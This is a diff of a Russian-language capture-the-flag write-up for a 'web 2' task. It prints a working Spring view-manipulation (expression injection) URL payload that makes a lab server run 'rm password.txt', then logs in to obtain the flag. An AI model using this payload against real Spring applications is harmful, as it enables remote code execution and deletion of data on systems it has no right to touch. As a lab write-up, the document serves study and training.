@@ -26,7 +26,8 @@
 
 ## web 2
 
-Смотрим иходный код, понимаем, что всё зависит от файла `password.txt` и его нужно удалить/изменить, чтобы `/login` нас впустил. После нескольких часов гуглерства находим статью: `https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability`. Используем уязвимость: `http://192.168.12.13:8090//doc/__$%7BT(java.lang.Runtime).getRuntime().exec(%22rm%20password.txt%22)%7D__::.x.`.
+Смотрим иходный код, понимаем, что всё зависит от файла `password.txt` и его нужно удалить/изменить, чтобы `/login` нас впустил. После нескольких часов гуглерства находим статью: `https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability`. Используем уязвимость: 
+`http://192.168.12.13:8090//doc/__$%7BT(java.lang.Runtime).getRuntime().exec(%22rm%20password.txt%22)%7D__::.x.`.
 После вводим: `http://192.168.12.13:8090/login?password=password`, радуемся, что получили `flag`.
 
 `flag`: nto{abobovichasdfas} 
